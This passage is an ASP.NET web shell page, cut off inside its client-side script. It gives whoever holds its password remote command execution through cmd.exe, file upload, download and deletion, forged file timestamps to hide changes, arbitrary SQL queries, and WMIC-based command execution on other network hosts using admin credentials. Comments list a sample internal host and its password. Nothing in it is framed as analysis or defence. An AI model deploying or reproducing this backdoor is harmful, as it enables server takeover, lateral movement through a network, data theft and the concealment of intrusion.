<%@ Page Language="C#" ValidateRequest="false" EnableViewState="false" %>
<%@ Import namespace="System.IO"%>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<%

NameValueCollection t=HttpContext.Current.Request.Form;
p=fb(t["p"]);
cmd=t["cmd"];
cmdB=fb(t["cmdB"]);
sav=fb(t["sav"]);
vir=t["vir"];
nen=fb(t["nen"]);
upb=fb(t["upb"]);
upd=fb(t["upd"]);
del=fb(t["del"]);
don=fb(t["don"]);
hid=t["hid"];
tfil=fb(t["tfil"]);
ttar=fb(t["ttar"]);
ttim=fb(t["ttim"]);
baseFile=t["baseFile"];
baseAddr=fb(t["baseAddr"]);
baseVir=t["baseVir"];
sqc=fb(t["sqc"]);
sqq=fb(t["sqq"]);
exadd=fb(t["exadd"]);
adminU=fb(t["adminU"]);
adminP=fb(t["adminP"]);
if(!string.IsNullOrEmpty(p))c(p);
else c();
pnlM.Visible = true;
if(!string.IsNullOrEmpty(cmd))r(cmd);
if(!string.IsNullOrEmpty(cmdB))fnCmdB(cmdB);
else if(HttpContext.Current.Request.Files["upl"]!=null)u(HttpContext.Current.Request.Files["upl"],sav,string.IsNullOrEmpty(vir)?false:true,nen,fb(t["isExp"]));
else if(!string.IsNullOrEmpty(upb))h(upb,upd);
else if(!string.IsNullOrEmpty(del))d(del);
else if(!string.IsNullOrEmpty(don))z(don);
else if(!string.IsNullOrEmpty(tfil))g(hid,tfil,ttar,ttim);
else if(!string.IsNullOrEmpty(baseFile))baseupl(baseFile,baseAddr,string.IsNullOrEmpty(baseVir)?false:true);
else if(!string.IsNullOrEmpty(sqc))sq(sqc,sqq);
else if(!string.IsNullOrEmpty(exadd))exp(exadd);
else if(!string.IsNullOrEmpty(t["gsize"]))gsize(fb(t["gsize"]));
else if(!string.IsNullOrEmpty(t["view"]))view(fb(t["view"]));
else if(!string.IsNullOrEmpty(t["delete"]))delete(fb(t["delete"]));
else if(!string.IsNullOrEmpty(t["rename1"]))rename(fb(t["rename1"]),fb(t["rename2"]));
else if(!string.IsNullOrEmpty(t["copy1"]))copy(fb(t["copy1"]),fb(t["copy2"]));

if(HttpContext.Current.Request.Cookies["data"]!=null){string data=fb(HttpContext.Current.Request.Cookies["data"].Value);string[] data2=data.Split(new string[]{"#|#"},StringSplitOptions.None);for(int i=0;i<data2.Length;i++){string[] data3=data2[i].Split(new string[]{"#=#"},StringSplitOptions.None);
switch (data3[0]){
case"pro":pro=a(pro,fb(data3[1]));break;
case"cmd":cmd=a(cmd,fb(data3[1]));break;
case"sav":sav=a(sav,fb(data3[1]));break;
case"vir":vir=a(vir,fb(data3[1]));break;
case"nen":nen=a(nen,fb(data3[1]));break;
case"don":don=a(don,fb(data3[1]));break;
case"tfil":tfil=a(tfil,fb(data3[1]));break;
case"ttar":ttar=a(ttar,fb(data3[1]));break;
case"ttim":ttim=a(ttim,fb(data3[1]));break;
case"sqc":sqc=a(sqc,fb(data3[1]));break;
case"sqq":sqq=a(sqq,fb(data3[1]));break;
case"exadd":exadd=a(exadd,fb(data3[1]));break;
case"adminU":adminU=a(adminU,fb(data3[1]));break;
case"adminP":adminP=a(adminP,fb(data3[1]));break;
}}}

view();
    %>
<script runat="server">
    string salt="sdfewq@#$51234234DF@#$!@#$ASDF";
    string p,pro,cmd,sav,vir,nen,upb,upd,del,don,hid,tfil,ttar,ttim,baseFile,baseAddr,baseVir,baseName,sqc,sqq,exadd,adminU,adminP,cmdB;
    string SpecialScript;
    bool aut=false;
    string pp="J3ugYdknpax1ZbHB2QILB5NS6dVa0iUD0mhhBPv0Srw=";
    string a(string a,string b){return string.IsNullOrEmpty(a)?b:a;}
    string tb(string a){string ret="";try{ret=string.IsNullOrEmpty(a)?a:Convert.ToBase64String(Encoding.UTF8.GetBytes(a));}catch{}return ret;}
    string fb(string a){string ret="";try{ret=string.IsNullOrEmpty(a)?a:Encoding.UTF8.GetString(Convert.FromBase64String(a));}catch{}return ret;}
    void view(){string data = string.Format("pro#=#{0}#|#cmd#=#{1}#|#sav#=#{2}#|#vir#=#{3}#|#nen#=#{4}#|#don#=#{5}#|#tfil#=#{6}#|#ttar#=#{7}#|#ttim#=#{8}|#sqc#=#{9}|#sqq#=#{10}|#exadd#=#{11}|#adminU#=#{12}|#adminP#=#{13}",
    tb(pro),tb(cmd),tb(sav),tb(vir),tb(nen),tb(don),tb(tfil),tb(ttar),tb(ttim),tb(sqc),tb(sqq),tb(exadd),tb(adminU),tb(adminP));
        HttpCookie coo=new HttpCookie("data", data);coo.Expires=DateTime.Now.AddDays(1);HttpContext.Current.Response.SetCookie(coo);}

    void rm(){/*System.IO.File.Delete(Request.ServerVariables["PATH_TRANSLATED"]);Response.Redirect(Request.RawUrl);*/Response.Redirect(Request.Url.AbsolutePath.Substring(0, Request.Url.AbsolutePath.LastIndexOf("/") + 1) + " " + Request.Url.AbsolutePath.Substring(Request.Url.AbsolutePath.LastIndexOf("/") + 1));}
    void c(string p){try{HttpCookie coo=new HttpCookie("p",tb(p));coo.Expires=DateTime.Now.AddDays(1);HttpContext.Current.Response.SetCookie(coo);c();}catch(Exception e){l(e.Message);}}
    bool c(){try{if(HttpContext.Current.Request.Cookies["p"]!=null){aut=Convert.ToBase64String(new System.Security.Cryptography.SHA256CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(fb(HttpContext.Current.Request.Cookies["p"].Value)+salt)))==pp;if(!aut)rm();return aut;}}catch(Exception e){l(e.Message);}rm();return false;}
    void baseupl(string baseFile,string baseAddr, bool baseVir){try{if(c()){if(baseFile!=null&&baseFile.Length>0&&!string.IsNullOrEmpty(baseAddr)){string SaveLocation=baseVir?Server.MapPath(baseAddr):baseAddr;System.IO.File.WriteAllBytes(SaveLocation,Convert.FromBase64String(baseFile));l("File uploaded successfuly : "+SaveLocation);}}}catch(Exception ex){l(ex.Message);}}
    void r(string cmd){try{if(c()){string o = exec(cmd);l(HttpUtility.HtmlEncode(o));}}catch(Exception ex){l(ex.Message);}}
    void z(string don){try{if(c()&&!string.IsNullOrEmpty(don)){byte[] f=System.IO.File.ReadAllBytes(don);System.Web.HttpContext t=System.Web.HttpContext.Current;t.Response.Clear();t.Response.ClearHeaders();t.Response.ClearContent();t.Response.AppendHeader("content-length",f.Length.ToString());t.Response.ContentType="application/octet-stream";t.Response.AppendHeader("content-disposition","attachment; filename="+don.Substring(don.LastIndexOf('\\')+1));t.Response.BinaryWrite(f);t.Response.End();}}catch(Exception ex){l(ex.Message);}}
    string ti(string tt){return "Creation Time :\t\t"+System.IO.File.GetCreationTime(tt).ToString("yyyy-MM-dd HH:mm:ss")+"<br>Last Access Time :\t"+System.IO.File.GetLastAccessTime(tt).ToString("yyyy-MM-dd HH:mm:ss")+"<br>Last Write Time :\t"+System.IO.File.GetLastWriteTime(tt).ToString("yyyy-MM-dd HH:mm:ss");}
    void g(string hid, string tfil, string ttar, string ttim){try{if(c()&&!string.IsNullOrEmpty(tfil)){l(string.Empty);if(hid=="1")ti(tfil);else if(hid=="2"){if(!string.IsNullOrEmpty(ttar)){System.IO.File.SetCreationTime(tfil,System.IO.File.GetCreationTime(ttar));System.IO.File.SetLastAccessTime(tfil,System.IO.File.GetLastAccessTime(ttar));System.IO.File.SetLastWriteTime(tfil,System.IO.File.GetLastWriteTime(ttar));l("Time successfuly changed :<br>"+tfil+"<br>"+ti(tfil));}}else if(hid=="3"){if(!string.IsNullOrEmpty(ttim)){DateTime te=DateTime.Parse(ttim);System.IO.File.SetCreationTime(tfil,te);System.IO.File.SetLastAccessTime(tfil,te);System.IO.File.SetLastWriteTime(tfil,te);l("Time successfuly changed :<br>"+tfil+"<br>"+ti(tfil));}}}}catch(Exception ex){l(ex.Message);}}
    void h(string upb, string upd){try{if(c()&&!string.IsNullOrEmpty(upb)&&!string.IsNullOrEmpty(upd)){System.IO.File.WriteAllBytes(System.IO.Path.GetTempPath()+upd,Convert.FromBase64String(upb));l(upd+" successfuly uploaded");}}catch(Exception ex){l(ex.Message);}}
    void d(string del){try{if(c()&&!string.IsNullOrEmpty(del)){System.IO.File.Delete(System.IO.Path.GetTempPath()+del);l(del+" successfuly deleled");}}catch(Exception ex){l(ex.Message);}}
    void sq(string sqc, string sqq){try{if(c()){if(!string.IsNullOrEmpty(sqc)){using(System.Data.SqlClient.SqlConnection con=new System.Data.SqlClient.SqlConnection(sqc)){if(string.IsNullOrEmpty(sqq)){try{con.Open();l("Sql Server Connection Successfuly Established");}catch(Exception ex){l("Sql Server Connection Failed :"+Environment.NewLine+ex.ToString());}}else{try{con.Open();System.Data.SqlClient.SqlCommand com=new System.Data.SqlClient.SqlCommand(sqq,con);System.Data.SqlClient.SqlDataAdapter ad=new System.Data.SqlClient.SqlDataAdapter(com);System.Data.DataTable dt=new System.Data.DataTable();ad.Fill(dt);DataGrid grid=new DataGrid();System.Web.UI.WebControls.DataList list=new System.Web.UI.WebControls.DataList();grid.DataSource=dt;grid.DataBind();log.Controls.Add(grid);}catch(Exception ex){l("Error : <br>"+ex.ToString());}}con.Close();}}}}catch(Exception ex){l(ex.Message);}}
    string x(string f){return Encoding.UTF8.GetString(Convert.FromBase64String(f));}
    void l(string ll){log.InnerHtml=tb(ll);}

    void u(HttpPostedFile upl, string sav, bool vir, string nen, string isExp)
    {
        try
        {
            if (c())
            {
                if (upl!=null&&upl.ContentLength>0)
                {
                    string fn=string.IsNullOrEmpty(nen)?System.IO.Path.GetFileName(upl.FileName):nen;
                    string path=vir?Server.MapPath(sav):sav;
                    string SaveLocation=System.IO.Path.HasExtension(path)?path:path.TrimEnd('\\')+"\\"+fn;upl.SaveAs(SaveLocation);
                    l("File uploaded successfuly : "+SaveLocation);
                    if (!string.IsNullOrEmpty(isExp))
                    {
                        SpecialScript = @"
openTab(document.getElementById('tabExp'), 'tbDir');
document.getElementsByName('exadd')[0].value = '"+sav.Replace("\\", "\\\\")+@"';
sendAddress();";
                    }
                }
            }
        }
        catch (Exception ex)
        {
            l(ex.Message);
        }
    }

    string exec(string cmd,string pro = "")
    {
        System.Diagnostics.Process n=new System.Diagnostics.Process();
        n.StartInfo.FileName=(string.IsNullOrEmpty(pro)?"cmd.exe":pro);
        n.StartInfo.UseShellExecute=false;
        n.StartInfo.RedirectStandardInput=true;
        n.StartInfo.RedirectStandardOutput=true;
        n.StartInfo.RedirectStandardError=true;
        n.StartInfo.CreateNoWindow=true;
        string o=null;
        n.Start();
        n.StandardInput.WriteLine(cmd);
        n.StandardInput.WriteLine("exit");
        o =n.StandardOutput.ReadToEnd();
        n.WaitForExit();
        n.Close();
        return o;
    }

    void fnCmdB(string cmd){
        string ret = "Error : -";
        try {
            if (c())
            {
                string o = exec(cmd);

                o = o.Remove(0, o.IndexOf(Environment.NewLine) + 2);
                o = o.Remove(0, o.IndexOf(Environment.NewLine) + 2);
                o = o.Remove(0, o.IndexOf(Environment.NewLine));
                o = o.Remove(o.LastIndexOf(Environment.NewLine));
                o = o.Remove(o.LastIndexOf(Environment.NewLine) + 2);

                ret = HttpUtility.HtmlEncode(o);
            }
        }
        catch (Exception ex)
        {
            ret = "Error : " + ex.Message;
        }

        Response.Clear();
        Response.Write(tb(ret));
        Response.End();
    }


    void gsize(string addr)
    {
        string ret = "Error : -";
        try
        {
            hasErrorInGetSize = false;
            long size = GetDirSize(new DirectoryInfo(addr));
            ret = sizeFix(size);

            if (hasErrorInGetSize && sizelvl == 0)
                ret = sizeError;
            else if(hasErrorInGetSize)
                ret = "!" + ret;
        }
        catch (Exception ex)
        {
            ret = "Error : " + ex.Message;
        }

        Response.Clear();
        Response.Write(tb(ret));
        Response.End();
    }

    void view(string path)
    {
        string ret = "You are viewing the contents of this file : " + path + Environment.NewLine;
        try
        {
            ret += File.ReadAllText(path);
        }
        catch (Exception ex)
        {
            ret = "Error : " + ex.Message;
        }

        Response.Clear();
        Response.Write(tb(ret));
        Response.End();
    }

    void delete(string path)
    {
        string ret = "Error : -";
        try
        {
            File.Delete(path);
            exp(Path.GetDirectoryName(path));
        }
        catch (Exception ex)
        {
            ret = "Error : " + ex.Message;
        }

        Response.Clear();
        Response.Write(tb(ret));
        Response.End();
    }

    void rename(string oldName, string newName)
    {
        string ret = "Error : -";
        try
        {
            File.Move(oldName, newName);
            exp(Path.GetDirectoryName(oldName));
        }
        catch (Exception ex)
        {
            ret = "Error : " + ex.Message;
        }

        Response.Clear();
        Response.Write(tb(ret));
        Response.End();
    }
    void copy(string oldName, string newName)
    {
        string ret = "Error : -";
        try
        {
            File.Copy(oldName, newName);
            ret = "File \"" + oldName + "\" successfuly copied to \"" + newName + "\"";
        }
        catch (Exception ex)
        {
            ret = "Error : " + ex.Message;
        }

        Response.Clear();
        Response.Write(tb(ret));
        Response.End();
    }
    void exp(string exadd)
    {
        string ret = "Error : -";
        try
        {
            if (c())
            {
                if (exadd.ToLower() == "root")
                {
                    ret = "{\"dir\":[{\"name\":\"\\\\\\\\localhost\"}";// in javascript json parser two \ = one \
                    string netUse = exec("net use");
                    string[] lines = netUse.Split(new string[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
                    foreach (string item in lines)
                    {
                        if (item.ToLower().StartsWith("ok"))
                        {
                            int index = item.IndexOf("\\\\");
                            ret += ",{\"name\":\"\\\\" + item.Substring(index, item.IndexOf('\\', index + 2) - index) + "\"}";
                        }
                    }
                    ret += "]}";
                }
                else
                {
                    if (exadd.StartsWith("\\\\") && exadd.Trim('\\').Split('\\').Count() == 1) // \\localhost
                    {
                        string tmp = exadd.ToLower().TrimEnd('\\');
                        if (tmp == "\\\\localhost")
                        {
                            ret = "{\"dir\":[";
                            bool isStart = false;
                            foreach (DriveInfo item in DriveInfo.GetDrives())
                            {
                                if (item.IsReady)
                                {
                                    if (isStart)
                                        ret += ",";
                                    ret += string.Format("{{\"name\":\"{0}\",\"totalSize\":\"{1}\",\"freeSpace\":\"{2}\",\"sizeText\":\"{3}\",\"format\":\"{4}\",\"type\":\"{5}\"}}"
                                        , item.Name.TrimEnd('\\').TrimEnd(':') + "$"
                                        , item.TotalSize
                                        , item.TotalFreeSpace
                                        , "[" + sizeFix(item.TotalFreeSpace) + "] free of [" + sizeFix(item.TotalSize) + "]"
                                        , item.DriveFormat
                                        , item.DriveType);
                                    isStart = true;
                                }
                            }
                            ret += "]}";
                        }
                        else
                        {
                            //wmic logicaldisk get Caption,FileSystem,Size,FreeSpace,Description
                            //wmic /node:{0} /user:{1} /password:{2} process call create ""cmd.exe /c {3} >> {4}"" 2>&1
                            //wmic /node:{0} /user:{1} /password:{2} process call create ""cmd.exe /c wmic logicaldisk get Caption,FileSystem,Size,FreeSpace,Description >> {4}"" 2>&1 
                            //wmic /node:localhost process call create ""cmd.exe /c wmic logicaldisk get Caption,FileSystem,Size,FreeSpace,Description >> c:\windows\temp\abcd.txt"" 2>&1 
                            if (!string.IsNullOrEmpty(adminU) && !string.IsNullOrEmpty(adminP))
                            {
                                //wmic /node:localhost process call create ""cmd.exe /c wmic logicaldisk get Caption,FileSystem,Size,FreeSpace,Description >> c:\windows\temp\abcd.txt"" 2>&1 
                                //Caption
                                //C:
                                //D:
                                //E:
                                //Caption
                                //C:
                                //D:
                                //E:
                                //FileSystem
                                //NTFS
                                //NTFS

                                //Size
                                //128842870784
                                //164711362560

                                //FreeSpace
                                //99978657792
                                //161243799552

                                //Description
                                //Local Fixed Disk
                                //Local Fixed Disk
                                //CD-ROM Disc

                                //type \\bdfdc\c$\windows\temp\KMSHFX0023.tmp 2>&1
                                //del \\bdfdc\c$\windows\temp\KMSHFX0023.tmp 2>&1

                                //wmic /node:bdfdc /user:veritas /password:veritas process call create "cmd.exe /c >> c:\windows\temp\KMSHFX0023.tmp 2>&1 wmic logicaldisk get Caption" 2>&1
                                //wmic /node:bdfdc /user:veritas /password:veritas process call create "cmd.exe /c >> c:\windows\temp\KMSHFX0023.tmp 2>&1 wmic logicaldisk get FileSystem" 2>&1
                                //wmic /node:bdfdc /user:veritas /password:veritas process call create "cmd.exe /c >> c:\windows\temp\KMSHFX0023.tmp 2>&1 wmic logicaldisk get Size" 2>&1
                                //wmic /node:bdfdc /user:veritas /password:veritas process call create "cmd.exe /c >> c:\windows\temp\KMSHFX0023.tmp 2>&1 wmic logicaldisk get FreeSpace" 2>&1
                                //wmic /node:bdfdc /user:veritas /password:veritas process call create "cmd.exe /c >> c:\windows\temp\KMSHFX0023.tmp 2>&1 wmic logicaldisk get Description" 2>&1

                                //Access  Availability  BlockSize  Caption  Compressed  ConfigManagerErrorCode  ConfigManagerUserConfig  CreationClassName  Description       DeviceID  DriveType  ErrorCleared  ErrorDescription  ErrorMethodology  FileSystem  FreeSpace     InstallDate  LastErrorCode  MaximumComponentLength  MediaType  Name  NumberOfBlocks  PNPDeviceID  PowerManagementCapabilities  PowerManagementSupported  ProviderName  Purpose  QuotasDisabled  QuotasIncomplete  QuotasRebuilding  Size          Status  StatusInfo  SupportsDiskQuotas  SupportsFileBasedCompression  SystemCreationClassName  SystemName  VolumeDirty  VolumeName  VolumeSerialNumber
                                //0                                C:       FALSE                                                        Win32_LogicalDisk  Local Fixed Disk  C:        3                                                            NTFS        99978657792                               255                     12         C:                                                                                                               TRUE            FALSE             FALSE             128842870784                      TRUE                TRUE                          Win32_ComputerSystem     BDFDC       FALSE                    54250D25
                                //0                                D:       FALSE                                                        Win32_LogicalDisk  Local Fixed Disk  D:        3                                                            NTFS        161243799552                              255                     12         D:                                                                                                               TRUE            FALSE             FALSE             164711362560                      TRUE                TRUE                          Win32_ComputerSystem     BDFDC       FALSE                    6C7130E4
                                //                                 E:                                                                    Win32_LogicalDisk  CD-ROM Disc       E:        5                                                                                                                                          11         E:                                                                                                                                                                                                                                                       Win32_ComputerSystem     BDFDC

                                tmp = tmp.TrimStart('\\');
                                exec(string.Format(@"del \\{0}\c$\windows\temp\KMSHFX0023.tmp 2>&1", tmp));
                                exec(string.Format(@"wmic /node:{0} /user:{1} /password:{2} process call create ""cmd.exe /c >> c:\windows\temp\KMSHFX0023.tmp 2>&1 wmic logicaldisk get Caption"" 2>&1", tmp, adminU, adminP));
                                exec(string.Format(@"wmic /node:{0} /user:{1} /password:{2} process call create ""cmd.exe /c >> c:\windows\temp\KMSHFX0023.tmp 2>&1 wmic logicaldisk get FileSystem"" 2>&1", tmp, adminU, adminP));
                                exec(string.Format(@"wmic /node:{0} /user:{1} /password:{2} process call create ""cmd.exe /c >> c:\windows\temp\KMSHFX0023.tmp 2>&1 wmic logicaldisk get Size"" 2>&1", tmp, adminU, adminP));
                                exec(string.Format(@"wmic /node:{0} /user:{1} /password:{2} process call create ""cmd.exe /c >> c:\windows\temp\KMSHFX0023.tmp 2>&1 wmic logicaldisk get FreeSpace"" 2>&1", tmp, adminU, adminP));
                                exec(string.Format(@"wmic /node:{0} /user:{1} /password:{2} process call create ""cmd.exe /c >> c:\windows\temp\KMSHFX0023.tmp 2>&1 wmic logicaldisk get Description"" 2>&1", tmp, adminU, adminP));
                                System.Threading.Thread.Sleep(1000);
                                string[] logicalDisk = File.ReadAllLines(string.Format(@"\\{0}\c$\windows\temp\KMSHFX0023.tmp", tmp));
                                System.Threading.Thread.Sleep(500);
                                exec(string.Format(@"del \\{0}\c$\windows\temp\KMSHFX0023.tmp 2>&1", tmp));

                                List<string> diskTemp = new List<string>();
                                bool firstTime = true;
                                int diskID = 0;
                                foreach (string item in logicalDisk)
                                {
                                    if (item == "Caption")
                                    {
                                        continue;
                                    }
                                    else if (item == "FileSystem" || item == "Size" || item == "FreeSpace" || item == "Description")
                                    {
                                        firstTime = false;
                                        diskID = 0;
                                        continue;
                                    }

                                    if (firstTime)
                                        diskTemp.Add(item);
                                    else
                                        diskTemp[diskID++] += "|" + item;
                                }

                                ret = "{\"dir\":[";
                                bool isStart = false;
                                foreach (string item in diskTemp)
                                {
                                    string[] diskInfo = item.Split('|');

                                    long TotalSize = long.Parse(diskInfo[2]);
                                    long TotalFreeSpace = long.Parse(diskInfo[3]);

                                    if (isStart)
                                        ret += ",";
                                    ret += string.Format("{{\"name\":\"{0}\",\"totalSize\":\"{1}\",\"freeSpace\":\"{2}\",\"sizeText\":\"{3}\",\"format\":\"{4}\",\"type\":\"{5}\"}}"
                                        , diskInfo[0].TrimEnd('\\').TrimEnd(':') + "$"
                                        , TotalSize
                                        , TotalFreeSpace
                                        , "[" + sizeFix(TotalFreeSpace) + "] free of [" + sizeFix(TotalSize) + "]"
                                        , diskInfo[1]
                                        , diskInfo[4]);
                                    isStart = true;
                                }
                                ret += "]}";
                            }
                            else
                                ret = "Error : Admin Username or Password is empty";
                        }
                    }
                    else // \\localhost\c$\
                    {
                        FileAttributes attr = File.GetAttributes(exadd);
                        if ((attr & FileAttributes.Directory) == FileAttributes.Directory)
                        {
                            DirectoryInfo dirInfo = new DirectoryInfo(exadd);
                            ret = "{" + string.Format("{0},{1}", createJsonDirectory(dirInfo.GetDirectories()), createJsonFile(dirInfo.GetFiles())) + "}";
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            ret = "Error : " + ex.Message;
        }
        Response.Clear();
        Response.Write(tb(ret));
        Response.End();
    }

    bool hasErrorInGetSize = false;
    int sizelvl = 0;
    string sizeError;
    long GetDirSize(DirectoryInfo d)
    {
        long size = 0;

        try
        {
            FileInfo[] fis = d.GetFiles();
            foreach (FileInfo fi in fis)
            {
                size += fi.Length;
            }

            sizelvl++;

            DirectoryInfo[] dis = d.GetDirectories();
            foreach (DirectoryInfo di in dis)
            {
                size += GetDirSize(di);
            }
        }
        catch (UnauthorizedAccessException ex)
        {
            sizeError = "Error : " + ex.Message;
            hasErrorInGetSize = true;
        }

        return size;
    }
    string createJsonDirectory(DirectoryInfo[] dir)
    {
        string json = "\"dir\":[";
        for (int i = 0; i < dir.Length; i++)
        {
            if (i > 0)
                json += ",";
            json += string.Format("{{\"name\":\"{0}\"}}", dir[i].Name);
            //json += "\"" + dir[i].Name + "\"";
        }
        json += "]";
        return json;
    }
    string createJsonFile(FileInfo[] file)
    {
        string json = "\"file\":[";
        for (int i = 0; i < file.Length; i++)
        {
            if (i > 0)
                json += ",";
            json += string.Format("{{\"name\":\"{0}\",\"size\":\"{1}\"}}",file[i].Name,sizeFix(file[i].Length));
        }
        json += "]";
        return json;
    }
    string sizeFix(long size)
    {
        double s = size;
        if (s < 1024) return s + " B";
        s = s / 1024;
        if (s < 1024) return Math.Round(s, 2) + " KB";
        s = s / 1024;
        if (s < 1024) return Math.Round(s, 2) + " MB";
        s = s / 1024;
        if (s < 1024) return Math.Round(s, 2) + " GB";
        s = s / 1024;
        return Math.Round(s, 2) + " TB";
    }
</script>

<style>body,html{margin:0;padding:0;direction:ltr;background:#000;color:#000 !important;}form{margin:0;}*{font:14px arial;}t{width:180px;display:inline-block;text-align:right;padding-right:5px;}g{margin-left:30px;}input[type="text"],input[type="file"],textarea {width:60%;height:25px;background:#cbcbcb;color:#000;border:1px solid #999;margin-bottom:3px;}input[type="text"]{padding:2px;}input[type="button"],input[type="submit"] {height:23px;}input[type="checkbox"]{width:23px;height:24px;position:absolute;margin:0;}hr{margin:0;border:0;border-top:1px solid #DDD;}.h{width:100px;text-align:center;background:rgb(255,36,0);color:#fff;vertical-align:middle;}table{width:100%;margin:0;border-collapse:collapse;}.b{padding:10px 0px 9px;}</style>
<script>
    function use() { var n = document; var d = n.getElementById("d").innerHTML; d = d.substring(0, d.lastIndexOf('\\') + 1); n.getElementsByName("cmd")[0].value += d; n.getElementById("uplSaveAddress").value += d; n.getElementsByName("don")[0].value += d; }
    function subm() { var mmm = document.getElementsByClassName('mmm'); for (var i = 0; i < mmm.length; i++) { mmm[i].value = b64EncodeUnicode(mmm[i].value);}}
    function reset() { document.cookie = "data=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/";location.href = location.pathname;}
</script>
<style>
    body{flex-direction:column;display:flex;padding:5px;font-family:Lato,'Helvetica Neue',Arial,Helvetica,sans-serif}
    div.tbbt{overflow:hidden;border:1px solid #ccc;background-color:#aaa}
    div.tbbt button{background-color:inherit;float:left;border:none;outline:none;cursor:pointer;padding:14px 16px;transition: 0.3s;font-size:17px;}
    div.tbbt button:hover{background-color:#ddd}
    div.tbbt button.active{background-color:#ccc}
    .tb{display:none;border:1px solid #ccc;border-top:none;padding:5px;background-color:#aaa}
    .loader{
        border:3px solid #f3f3f3;
        border-radius:50%;
        border-top:3px solid #3498db;
        width:16px;
        height:16px;
        -webkit-animation: spin 2s linear infinite;
        animation:spin 2s linear infinite;
        position:absolute;
    }
    @-webkit-keyframes spin {
        0%{ -webkit-transform:rotate(0deg);}
        100%{-webkit-transform:rotate(360deg);}
    }
    @keyframes spin {
        0%{ transform:rotate(0deg);}
        100%{transform:rotate(360deg);}
    }
    #objFrame{padding:0 5px 5px 5px}
    .objRight {
        display: table;
        padding:0 5px;
        cursor: pointer;
        float:left;
        line-height:24px;
        border-radius: 0 5px 5px 0;
    }
    .objD{background-color: #23a4ff}
    .objD:hover {background-color:#63beff}
    .objN {background-color: #23d7ff}
    .objN:hover {background-color:#72e5ff}
    .objF {
        margin-top: 5px;
        min-height: 24px;
    }
    .objLeft {
        position: relative;
        padding: 0 5px;
        float: left;
        width: 75px;
        background-color: #c3c3c3;
        border-radius: 5px 0 0 5px;
        line-height: 24px;
    }
    .objS {
        text-align: right;
        cursor: default;
        overflow: hidden;
        max-height: 24px;
        min-height: 24px;
    }
    .objS:hover {
        background-color: #d3d3d3;
    }
    .objB {
        padding: 0 5px;
        float: left;
        line-height: 24px;
    }
    .objL{display:inline-block;margin-left:3px;}
    .objLocHolder{
        padding: 0 5px 0 5px;
        min-height: 24px;
        margin-top: 5px;
    }
    .objError {
        background-color: #ff2e2e;
        color: white;
    }
    .objError:hover {
        background-color: #8a1b1b;
    }
    .driveSizeProgress {
        width:200px;
        border:1px solid white;
        background-color:#d8d6d6;
        height: 22px;
        float: left;
        margin-left: 5px;
        border-radius:5px;
    }
    .driveSizeProgress div{
        background-color:#26a0da;
        height: 22px;
        border-radius:5px;
    }
    .driveSizeText {
        float: left;
        margin-left: 5px;
    }
    .driveSizeText .t{
        padding: 4px;
        display: inline-block;
        color: #444444;
        border: 1px solid #e0e0e0;
        border-radius: 5px 0 0 5px;
    }
    .driveSizeText .v{
        background-color: #e0e0e0;
        padding: 5px;
        display: inline-block;
        border-radius:0 5px 5px 0;
    }
    .cat {
        float:left;
        padding-top: 5px;
    }
    #log {
        flex:1 0;
        overflow-y:scroll;
        color:#fff;
        margin:0;
        padding-top:5px;
        min-height:500px;
        font-family:"Lucida Console";
    }
    .iCmd {
        float:left;
        margin-left:5px;
        border-radius:5px;
        cursor: pointer;
        background-color: #d6d6d6;
        display: inline-block;
        padding: 0 5px;
        line-height: 20px;
        user-select: none;
        border:2px solid;
    }
    .iInput {
    float: left;
    margin-left: 5px;
    border: 2px solid;
    border-radius: 5px;
    }
    .iInput .t{
    display: inline-block;
    color: #444444;
    border-radius: 5px 0 0 5px;
    cursor: default;
    background-color: #cbcbcb;
    }
        .iInput .t input {
        border: none;
        margin: 0;
        padding: 0 5;
        line-height: 22px;
        background: none;
        width: 100px;
        height: 20px;
        }
    .iInput .v{
    background-color: #d6d6d6;
    padding: 0 5px;
    display: inline-block;
    border-radius: 0 5px 5px 0;
    cursor: pointer;
    border-left: 2px solid;
    line-height: 20px;
    }
    .iInput.iRename {
        color:#a291fb;border-color:#a291fb;
    }
    .iInput.iRename .v {
        border-color:#a291fb;
    }
    .iInput.iRename .v:hover {
        color:#fff;background-color:#8a73ff;border-color:#8a73ff;
    }
    .iInput.iRename .v:active {
        background-color:#7860f9;
    }
    .iInput.iCopy {
        color:#a96216;border-color:#a96216;
    }
    .iInput.iCopy .v {
        border-color:#a96216;
    }
    .iInput.iCopy .v.copy {
        border-radius:0;
    }
    .iInput.iCopy .v:hover {
        color:#fff;background-color:#c86f11;border-color:#c86f11;
    }
    .iInput.iCopy .v:active {
        background-color:#a96216;
    }
    .iDownload {color:#ff5bd1;border-color:#ff5bd1;}
    .iDownload:hover {color:#fff;border-color:#ff74d8;background-color:#ff74d8;}
    .iDownload:active {background-color:#ff5bd1;}
    .iDelete {color:#dc73ff;border-color:#dc73ff;}
    .iDelete:hover {color:#fff;border-color:#d65aff;background-color:#d65aff;}
    .iDelete:active {background-color:#cf40ff;}
    /*.iRename {color:#a291fb;border-color:#a291fb;}
    .iRename:hover {color:#fff;border-color:#8a73ff;background-color:#8a73ff;}
    .iRename:active {background-color:#7860f9;}*/
    
    /*">Download</div><div class="iCmd iDelete">Delete</div><div class="iCmd iRename">Rename</div>*/
</style>
<script>
    var sizeArray = new Array();
    function openTab(sender, nm)
    {
        var i, tb, tblnk;
        tb = document.getElementsByClassName("tb");
        for (i = 0; i < tb.length; i++) {
            tb[i].style.display = "none";
        }
        tblnk = document.getElementsByClassName("tblnk");
        for (i = 0; i < tblnk.length; i++) {
            tblnk[i].className = "tblnk";
        }
        document.getElementById(nm).style.display = "block";
        sender.className += " active";

    }
    function fixLogSize()
    {
        console.log("calc(100% - " + document.getElementById('header').offsetHeight + ")");
        document.getElementById('log').style.height = "calc(100% - " + document.getElementById('header').offsetHeight + ")";
    }

    function readCookie(name)
    {
        var nameEQ = name + "=";
        var ca = document.cookie.split(';');
        for (var i = 0; i < ca.length; i++) {
            var c = ca[i];
            while (c.charAt(0)==' ') c = c.substring(1, c.length);
            if(c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
        }
        return null;
    }
    function proecessDirectory(resText)
    {
        document.getElementById("loader").style.display = "none";
        var data = b64DecodeUnicode(resText)
        makeLocation();
        var Frame = document.getElementById("objFrame");
        Frame.innerHTML = "";
        if (data.startsWith("Error")) {
            addError(Frame, data);
        }
        else {
